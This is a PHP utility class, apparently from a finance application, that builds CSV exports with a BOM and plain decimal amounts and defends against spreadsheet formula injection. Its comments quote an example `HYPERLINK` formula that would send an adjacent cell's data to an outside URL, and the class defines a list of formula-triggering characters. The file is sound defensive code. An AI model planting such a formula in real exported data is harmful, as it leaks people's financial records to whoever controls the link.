<?php

declare(strict_types=1);

namespace Kern\Platform\Text;

/**
 * The two conventions every CSV this application hands out follows.
 *
 * Here rather than in a module because the second exporter wanted the same two, and a spreadsheet
 * that opens one of our files should behave the same way for all of them — the same place and the
 * same reason `Text\PartyName` lives here.
 *
 * ## A BOM
 *
 * Excel on Windows reads a UTF-8 file without one as the system codepage and turns every Romanian
 * diacritic into mojibake. The file stays valid UTF-8 for everything else.
 *
 * ## Amounts written plainly
 *
 * `1234.56` — dot decimal, no grouping, no currency in the cell. A spreadsheet reads that as a
 * number in every locale; `1.234,56 RON` is text in most of them, and a column of text that looks
 * like money is worse than a column of numbers needing a header to explain itself. The currency
 * belongs in its own column.
 *
 * ## No cell a spreadsheet would run
 *
 * A cell starting with `=`, `+`, `-` or `@` — or a tab or carriage return, which Excel skips before
 * looking — is a formula to a spreadsheet, and several of these columns are text a stranger chose: a
 * counterparty's name, a transfer's description, straight from a bank statement. Opened in Excel, a
 * description of `=HYPERLINK("https://…?"&A2, "…")` becomes a link that carries the row beside it away.
 * Such a cell is written with a leading `'`, which Excel shows as text and does not display.
 *
 * A cell that is only a number is left alone, though `-12.50` starts with `-`: it is an amount this
 * file wrote, a spreadsheet must still add it up, and a number cannot be a formula.
 */
final class CsvFile
{
    /** What a spreadsheet takes as the start of a formula. */
    private const string FORMULA_LEAD = "=+-@\t\r";
    /**
     * @param  list<list<string>>  $rows
     */
    public static function fromRows(array $rows): string
    {
        $handle = fopen('php://temp', 'r+');

        if ($handle === false) {
            return '';
        }

        fwrite($handle, "\u{FEFF}");

        foreach ($rows as $row) {
            fputcsv($handle, array_map(self::inert(...), $row), ',', '"', '\\');
        }

        rewind($handle);
        $csv = stream_get_contents($handle);
        fclose($handle);

        return $csv === false ? '' : $csv;
    }

    private static function inert(string $cell): string
    {
        if ($cell === '' || ! str_contains(self::FORMULA_LEAD, $cell[0]) || is_numeric($cell)) {
            return $cell;
        }

        return "'" . $cell;
    }

    /** Minor units as a cell a spreadsheet reads as a number. */
    public static function decimal(int $minor): string
    {
        return number_format($minor / 100, 2, '.', '');
    }
}
